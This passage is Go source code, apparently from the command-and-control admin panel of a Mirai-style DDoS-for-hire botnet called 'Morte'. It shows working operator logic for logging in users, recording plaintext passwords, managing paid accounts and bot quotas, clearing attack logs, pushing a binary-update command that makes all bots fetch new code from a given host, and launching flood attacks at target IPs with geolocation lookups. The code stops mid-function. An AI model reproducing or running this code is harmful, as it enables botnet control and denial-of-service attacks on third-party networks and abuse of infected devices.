package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[39m\033[38;5;125mUsername \x1b[38;5;231m:\x1b[39m\033[38;5;125m "))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[39m\033[38;5;125mPassword \x1b[38;5;231m:\x1b[39m\033[38;5;125m "))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		msg := fmt.Sprintf("\033[38;5;125mLoading... \x1b[38;5;231m%c\033[0m\r", spinBuf[i%len(spinBuf)])
		this.conn.Write([]byte(msg))
		time.Sleep(100 * time.Millisecond)
	}

	AccountInfo, isInitialPassword, err := database.TryLogin(username, password)
	if err != nil {
		this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mLogin failed: " + err.Error() + " \033[0m\x1b[1;37m\r\n"))
		return
	}

	if isInitialPassword == 1 {
		this.conn.Write([]byte("\x1b[39m\033[38;5;125mPlease change your initial password\x1b[38;5;231m: "))
		newPassword, err := this.ReadLine(true)
		if err != nil {
			return
		}
		err = database.UpdateInitialPassword(username, newPassword)
		if err != nil {
			this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mFailed to update password \033[0m\x1b[1;37m\r\n"))
			return
		}
		this.conn.Write([]byte("\x1b[1;32mPassword updated successfully\033[0m\r\n"))
	}

	database.SetOnline(username, true)
	defer database.SetOnline(username, false)
	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		success := "successful login"
		usernameFormat := "username:"
		passwordFormat := "password:"
		ipFormat := "ip:"
		cmdSplit := "|"
		log.SetOutput(loginLogsOutput)
		log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
	}

	PrintBanner(this.conn)

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > AccountInfo.maxBots && AccountInfo.maxBots != -1 {
				BotCount = AccountInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			expiryStr := calculateExpiry(AccountInfo.last_paid, AccountInfo.intvl)
			runningAttacks := database.fetchRunningAttacks()
			onlineCount := database.GetOnlineUserCount()
			title := fmt.Sprintf("\033]0;Bots : %d | Slot : %d/%d | Login : %s | Expires : %s | Online : %d\007", BotCount, runningAttacks, config.GobalSlot, username, expiryStr, onlineCount)
			if _, err := this.conn.Write([]byte(title)); err != nil {
				this.conn.Close()
				break
			}
			time.Sleep(time.Second)
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[38;5;231m[ \x1b[39m\033[38;5;125m" + username + " \x1b[38;5;231m• \x1b[39m\033[38;5;125mMorte \x1b[38;5;231m] \x1b[39m\033[38;5;125m►\x1b[38;5;231m "))
		cmd, err := this.ReadLine(false)
		if cmd == "" {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		if cmd == "cls" || cmd == "clear" || cmd == "c" {
			PrintBanner(this.conn)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if cmd == "Methods" || cmd == "METHODS" || cmd == "methods" {
			PrintMethods(this.conn)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if cmd == "help" || cmd == "HELP" || cmd == "Help" {
			PrintHelp(this.conn)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if err != nil || cmd == "logout" || cmd == "LOGOUT" || cmd == "Logout" || cmd == "exit" || cmd == "Exit" || cmd == "EXIT" {
			return
		}

		if AccountInfo.admin == 1 && strings.HasPrefix(cmd, "edit ") {
			parts := strings.SplitN(cmd, " ", 2)
			if len(parts) != 2 {
				this.conn.Write([]byte("Usage: edit <username>\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			targetUsername := parts[1]
			userInfo, err := database.GetUserInfo(targetUsername)
			if err != nil {
				if err.Error() == "user not found" {
					this.conn.Write([]byte("User not found\r\n"))
				} else {
					this.conn.Write([]byte("Error: " + err.Error() + "\r\n"))
				}
				time.Sleep(100 * time.Millisecond)
				continue
			}
			this.conn.Write([]byte(fmt.Sprintf("Select attribute to modify for user %s:\r\n", targetUsername)))
			this.conn.Write([]byte(fmt.Sprintf("1. Expired: %d days (0 = unlimited)\r\n", userInfo.intvl)))
			this.conn.Write([]byte(fmt.Sprintf("2. Cooldown: %d seconds\r\n", userInfo.cooldown)))
			this.conn.Write([]byte(fmt.Sprintf("3. Duration: %d seconds\r\n", userInfo.duration_limit)))
			this.conn.Write([]byte(fmt.Sprintf("4. Bots: %d (-1 = full bots)\r\n", userInfo.maxBots)))
			adminStr := "No"
			if userInfo.admin == 1 {
				adminStr = "Yes"
			}
			this.conn.Write([]byte(fmt.Sprintf("5. Admin: %s\r\n", adminStr)))
			banStr := "No"
			if userInfo.ban == 1 {
				banStr = "Yes"
			}
			this.conn.Write([]byte(fmt.Sprintf("6. Ban: %s\r\n", banStr)))
			apiAccessStr := "No"
			if userInfo.api_access == 1 {
				apiAccessStr = "Yes"
			}
			this.conn.Write([]byte(fmt.Sprintf("7. API Access: %s\r\n", apiAccessStr)))
			this.conn.Write([]byte("Enter selection (1-7): "))
			selection, err := this.ReadLine(false)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			switch selection {
			case "1":
				this.modifyNumericalAttribute("Expired", userInfo.intvl, func(newValue int) error {
					return database.UpdateUserExpiry(targetUsername, newValue)
				})
			case "2":
				this.modifyNumericalAttribute("Cooldown", userInfo.cooldown, func(newValue int) error {
					return database.UpdateUserCooldown(targetUsername, newValue)
				})
			case "3":
				this.modifyNumericalAttribute("Duration", userInfo.duration_limit, func(newValue int) error {
					return database.UpdateUserDurationLimit(targetUsername, newValue)
				})
			case "4":
				this.modifyNumericalAttribute("Bots", userInfo.maxBots, func(newValue int) error {
					return database.UpdateUserMaxBots(targetUsername, newValue)
				})
			case "5":
				this.toggleBooleanAttribute("Admin", userInfo.admin, func(newValue int) error {
					return database.UpdateUserAdminStatus(targetUsername, newValue)
				})
			case "6":
				this.toggleBooleanAttribute("Ban", userInfo.ban, func(newValue int) error {
					return database.UpdateUserBanStatus(targetUsername, newValue)
				})
			case "7":
				this.toggleBooleanAttribute("API Access", userInfo.api_access, func(newValue int) error {
					return database.UpdateUserAPIAccess(targetUsername, newValue)
				})
			default:
				this.conn.Write([]byte("Invalid selection\r\n"))
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if AccountInfo.admin == 1 && strings.HasPrefix(cmd, "attacks") {
			if cmd == "attacks" {
				this.conn.Write([]byte("\x1b[1;33m(attacks enable/disable)\033[0m\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if cmd == "attacks enable" || cmd == "attacks disable" {
				enabled := (cmd == "attacks enable")
				err := database.UpdateAttackStatus(enabled)

				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125mError updating attack status: %s \033[0m\x1b[1;37m\r\n", err.Error())))
				} else {
					status := "disabled"
					if enabled {
						status = "enabled"
					}
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mAttacks have been %s.\033[0m\r\n", status)))
				}
				time.Sleep(100 * time.Millisecond)
				continue
			}
		}

		if cmd == "ongoing" || cmd == "Ongoing" || cmd == "ONGOING" {
			attacks, err := database.GetOngoingAttacks(username, AccountInfo.admin == 1)
			if err != nil {
				this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mError fetching ongoing attacks \033[0m\x1b[1;37m\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if len(attacks) == 0 {
				this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mNo ongoing attacks. \033[0m\x1b[1;37m\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			var columns []string
			if AccountInfo.admin == 1 {
				columns = []string{"\x1b[39m\033[38;5;125m#", "\x1b[39m\033[38;5;125mUsername", "\x1b[39m\033[38;5;125mTargets", "\x1b[39m\033[38;5;125mPort", "\x1b[39m\033[38;5;125mMethod", "\x1b[39m\033[38;5;125mTime Left"}
			} else {
				columns = []string{"\x1b[39m\033[38;5;125m#", "\x1b[39m\033[38;5;125mTargets", "\x1b[39m\033[38;5;125mPort", "\x1b[39m\033[38;5;125mMethod", "\x1b[39m\033[38;5;125mTime Left"}
			}
			dataRows := [][]string{}
			for i, attack := range attacks {
				row := []string{
					fmt.Sprintf("\x1b[39m\033[38;5;125m%d", i+1),
				}
				if AccountInfo.admin == 1 {
					row = append(row, attack.username)
				}
				port := attack.port
				if port == "" {
					port = "\x1b[39m\033[38;5;125mN/A"
				}
				row = append(row, attack.targets, port, attack.method, fmt.Sprintf("%d", attack.time_left))
				dataRows = append(dataRows, row)
			}
			printTable(this.conn, columns, dataRows)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if cmd == "plan" || cmd == "Plan" || cmd == "PLAN" {
			u, err := database.GetUserInfo(username)
			if err != nil {
				this.conn.Write([]byte("\x1b[1;31mError fetching plan: " + err.Error() + "\033[0m\r\n"))
			} else {
				PrintPlan(this.conn, u)
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if cmd == "pass" || cmd == "Pass" || cmd == "PASS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;27mNew password \033[1;37m> \x1b[38;5;99m"))
			newPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[38;5;99mConfirm? (y/n) \x1b[38;5;99m"))
			confirmation, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirmation != "y" && confirmation != "Y" {
				this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mPassword change canceled \033[0m\x1b[1;37m\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			} else {
				username := AccountInfo.username
				success := database.ChangePass(username, newPassword)
				if success {
					this.conn.Write([]byte("Password successfully changed\r\n"))
				} else {
					this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mFailed to change password \033[0m\x1b[1;37m\r\n"))
				}
				time.Sleep(100 * time.Millisecond)
				continue
			}
		}

		if AccountInfo.admin == 1 && (cmd == "userlist" || cmd == "Userlist" || cmd == "USERLIST") {
			users, err := database.GetAllUsers()
			if err != nil {
				this.conn.Write([]byte("\x1b[1;30mError fetching user list: " + err.Error() + "\033[0m\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			columns := []string{"\x1b[39m\033[38;5;125mUsername", "\x1b[39m\033[38;5;125mMax Bots", "\x1b[39m\033[38;5;125mAdmin", "\x1b[39m\033[38;5;125mCooldown", "\x1b[39m\033[38;5;125mDuration", "\x1b[39m\033[38;5;125mOnline", "\x1b[39m\033[38;5;125mExpiry", "\x1b[39m\033[38;5;125mApi", "\x1b[39m\033[38;5;125mBan"}
			dataRows := [][]string{}
			for _, user := range users {
				adminStr := "\x1b[38;2;198;40;40mNo"
				if user.admin == 1 {
					adminStr = "\x1b[38;5;118mYes"
				}
				onlineStr := "\x1b[38;2;198;40;40mFalse"
				if user.online == 1 {
					onlineStr = "\x1b[38;5;118mTrue"
				}

				expiryStr := calculateExpiry(user.last_paid, user.intvl)
				if expiryStr == "Expired" {
					expiryStr = "\x1b[38;2;198;40;40mExpired"
				} else if expiryStr != "Unlimited" {
					expiryStr = fmt.Sprintf("\x1b[39m\033[38;5;125m%s", expiryStr)
				} else {
					expiryStr = "\x1b[39m\033[38;5;125mUnlimited"
				}

				api_access_str := "\x1b[38;2;198;40;40mFalse"
				if user.api_access == 1 {
					api_access_str = "\x1b[38;5;118mTrue"
				}

				banStr := "\x1b[38;2;198;40;40mFalse"
				if user.ban == 1 {
					banStr = "\x1b[38;5;118mTrue"
				}

				row := []string{
					user.username,
					fmt.Sprintf("%d", user.maxBots),
					adminStr,
					fmt.Sprintf("%d", user.cooldown),
					fmt.Sprintf("%d", user.duration_limit),
					onlineStr,
					expiryStr,
					api_access_str,
					banStr,
				}
				dataRows = append(dataRows, row)
			}
			printTable(this.conn, columns, dataRows)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|"
			log.SetOutput(output)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}

		botCount = AccountInfo.maxBots

		if AccountInfo.admin == 1 && cmd == "logs" {
			this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if !database.CleanLogs() {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125mError, can't clear logs, please check debug logs \033[0m\x1b[1;37m\r\n")))
			} else {
				this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
				fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if AccountInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if AccountInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			this.conn.Write([]byte("Expiry days (0 for unlimited): "))
			intvl_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			intvl, err := strconv.Atoi(intvl_str)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			this.conn.Write([]byte("Api access (1 for enabled): "))
			api_access_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			api_access, err := strconv.Atoi(api_access_str)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			this.conn.Write([]byte("Admin role (y/n): "))
			is_admin_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			admin := 0
			if strings.ToLower(is_admin_str) == "y" {
				admin = 1
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte("Expiry Days: " + intvl_str + "\r\n"))
			this.conn.Write([]byte("Api Access: " + api_access_str + "\r\n"))
			this.conn.Write([]byte("Admin: " + fmt.Sprint(admin) + "\r\n"))
			this.conn.Write([]byte("Confirm[y/n]: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown, intvl, api_access, admin) {
				this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mFailed to create User! \033[0m\x1b[1;37m\r\n"))
			} else {
				this.conn.Write([]byte("User successfully created! \r\n"))
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if AccountInfo.admin == 1 && (cmd == "bots" || cmd == "Bots") {
			botCount := clientList.Count()
			botGroups := make(map[string]int)

			for _, bot := range clientList.clients {
				botGroups[bot.source]++
			}

			for source, count := range botGroups {
				line := fmt.Sprintf("\x1b[38;5;231m[\033[38;5;125m%s\x1b[38;5;231m] \033[38;5;125m: \x1b[38;5;231m%d\r\n", source, count)
				this.conn.Write([]byte(line))
			}

			totalLine := fmt.Sprintf("\x1b[38;5;231mTotal bots \033[38;5;125m: \x1b[38;5;231m%d\r\n", botCount)
			this.conn.Write([]byte(totalLine))
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125mFailed To Parse Botcount \"%s\" \033[0m\x1b[1;37m\r\n", count)))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if AccountInfo.maxBots != -1 && botCount > AccountInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125mBot Count To Send Is Bigger Than Allowed Bot Maximum \033[0m\x1b[1;37m\r\n")))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			cmd = countSplit[1]
		}

		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		if AccountInfo.admin == 1 && strings.HasPrefix(cmd, "update ") {
			parts := strings.Split(cmd, " ")
			if len(parts) != 4 {
				this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mUsage: update <ip> <bin_prefix> <bin_directory> \033[0m\x1b[1;37m\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			}

			ip := parts[1]
			binPrefix := parts[2]
			binDirectory := parts[3]

			updateData := []byte{254}

			ipBytes := []byte(ip)
			updateData = append(updateData, byte(len(ipBytes)))
			updateData = append(updateData, ipBytes...)

			prefixBytes := []byte(binPrefix)
			updateData = append(updateData, byte(len(prefixBytes)))
			updateData = append(updateData, prefixBytes...)

			dirBytes := []byte(binDirectory)
			updateData = append(updateData, byte(len(dirBytes)))
			updateData = append(updateData, dirBytes...)

			attackPayload := make([]byte, 4+len(updateData))

			binary.BigEndian.PutUint32(attackPayload[0:4], uint32(0))

			copy(attackPayload[4:], updateData)

			finalPayload := make([]byte, 2+len(attackPayload))
			binary.BigEndian.PutUint16(finalPayload[0:2], uint16(len(attackPayload)))
			copy(finalPayload[2:], attackPayload)

			clientList.QueueBuf(finalPayload, -1, "")

			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mUpdate command sent to all bots.\r\n")))
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if cmd == "stop" {
			if AccountInfo.admin != 1 {
				this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mOnly admins can use the stop command \033[0m\x1b[1;37m\r\n"))
				time.Sleep(100 * time.Millisecond)
				continue
			}

			_, err := database.StopAllRunningAttacks()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125mError stopping attacks in database: %s \033[0m\x1b[1;37m\r\n", err.Error())))
			}

			atk, err := NewAttack(cmd, AccountInfo.admin)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125m%s \033[0m\x1b[1;37m\r\n", err.Error())))
				time.Sleep(100 * time.Millisecond)
				continue
			}
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125m%s \033[0m\x1b[1;37m\r\n", err.Error())))
				time.Sleep(100 * time.Millisecond)
				continue
			}

			clientList.QueueBuf(buf, -1, "")
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mStop command successfully sent to %d bots\033[0m\r\n", botCount)))

			time.Sleep(100 * time.Millisecond)
			continue
		}

		atk, err := NewAttack(cmd, AccountInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125m%s \033[0m\x1b[1;37m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125m%s \033[0m\x1b[1;37m\r\n", err.Error())))
			} else {
				can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0, config.GobalSlot)
				if !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[48;5;231m \033[38;5;125m%s \033[0m\x1b[1;37m\r\n", err.Error())))
				} else {
					if database.ContainsWhitelistedTargets(atk) {
						fmt.Println("\x1b[48;5;231m \033[38;5;125mBlocked Attack By " + username + " To Whitelisted Prefix \033[0m\x1b[1;37m\r\n")
					} else {
						clientList.QueueBuf(buf, botCount, botCatagory)

						var targetIP string
						for ipUint32 := range atk.Targets {
							ip := make(net.IP, 4)
							binary.BigEndian.PutUint32(ip, ipUint32)
							targetIP = ip.String()
							break
						}

						ipInfo, err := getIPInfo(targetIP, config.IPInfoToken)
						country, org, region := "Unknown", "Unknown", "Unknown"
						if err == nil {
							country = ipInfo.Country
							org = ipInfo.Org
							region = ipInfo.Region
						}

						port := "N/A"
						if portStr, ok := atk.Flags[7]; ok {
							port = portStr
						}

						methodName := "Unknown"
						for name, info := range attackInfoLookup {
							if info.attackID == atk.Type {
								methodName = name
								break
							}
						}

						lines := []string{
							"\r\n",
							fmt.Sprintf("  \x1b[38;5;231m[ \033[38;5;125mAttacks details \x1b[38;5;231m]\r\n"),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mStatus \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[38;5;84mSuccessfully \x1b[38;5;231m]\r\n"),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mMethod \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", methodName),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mTarget \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", targetIP),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mPort \x1b[39m\033[38;5;125m······· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", port),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mTime \x1b[39m\033[38;5;125m······· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%d \x1b[38;5;231m]\r\n", atk.Duration),
							fmt.Sprintf("  \x1b[38;5;231m[ \033[38;5;125mTarget info \x1b[38;5;231m]\r\n"),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mCountry \x1b[39m\033[38;5;125m···· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", country),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mOrg \x1b[39m\033[38;5;125m········ \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", org),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mRegion \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", region),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mDate \x1b[39m\033[38;5;125m······· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", time.Now().Format("2006-01-02 15:04:05")),
							fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mSent by \x1b[39m\033[38;5;125m···· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", username),
							"\r\n",
						}

						for _, line := range lines {
							this.conn.Write([]byte(line))
							time.Sleep(30 * time.Millisecond)
						}

						logOutput, err := os.OpenFile("logs/attacks.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
						if err != nil {
							fmt.Println("Error opening log file:", err)
							return
						}
						defer logOutput.Close()

						logger := log.New(logOutput, "", log.LstdFlags)
						currentTime := time.Now().Format("2006-01-02 15:04:05")
						logger.Printf("[%s] Method: CLI | User: %s | IP: %s | Method: %s | Target: %s | Port: %s | Duration: %d | Result: %s | Reason: %s",
							currentTime, username, this.conn.RemoteAddr().String(), methodName, targetIP, port, atk.Duration, "success", "")
					}
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte("\b \b"))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
}

func (this *Admin) modifyNumericalAttribute(attributeName string, currentValue int, updateFunc func(int) error) {
	this.conn.Write([]byte(fmt.Sprintf("Current %s: %d\r\n", attributeName, currentValue)))
	this.conn.Write([]byte(fmt.Sprintf("Enter new %s: ", attributeName)))
	newValueStr, err := this.ReadLine(false)
	if err != nil {
		return
	}
	newValue, err := strconv.Atoi(newValueStr)
	if err != nil {
		this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mInvalid input, must be an integer \033[0m\x1b[1;37m\r\n"))
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("Set %s to %d? (y/n): ", attributeName, newValue)))
	confirm, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if confirm == "y" {
		err = updateFunc(newValue)
		if err != nil {
			this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mError updating: " + err.Error() + "\r\n"))
		} else {
			this.conn.Write([]byte("Updated successfully\r\n"))
		}
	} else {
		this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mCancelled \033[0m\x1b[1;37m\r\n"))
	}
}

func (this *Admin) toggleBooleanAttribute(attributeName string, currentValue int, updateFunc func(int) error) {
	currentStr := "No"
	if currentValue == 1 {
		currentStr = "Yes"
	}
	this.conn.Write([]byte(fmt.Sprintf("Current %s: %s\r\n", attributeName, currentStr)))
	this.conn.Write([]byte("Toggle? (y/n): "))
	toggle, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if toggle == "y" {
		newValue := 1 - currentValue
		newStr := "Yes"
		if newValue == 0 {
			newStr = "No"
		}
		this.conn.Write([]byte(fmt.Sprintf("Set %s to %s? (y/n): ", attributeName, newStr)))
		confirm, err := this.ReadLine(false)
		if err != nil {
			return
		}
		if confirm == "y" {
			err = updateFunc(newValue)
			if err != nil {
				this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mError updating: " + err.Error() + " \033[0m\x1b[1;37m\r\n"))
			} else {
				this.conn.Write([]byte("Updated successfully\r\n"))
			}
		} else {
			this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mCancelled \033[0m\x1b[1;37m\r\n"))
		}
	} else {
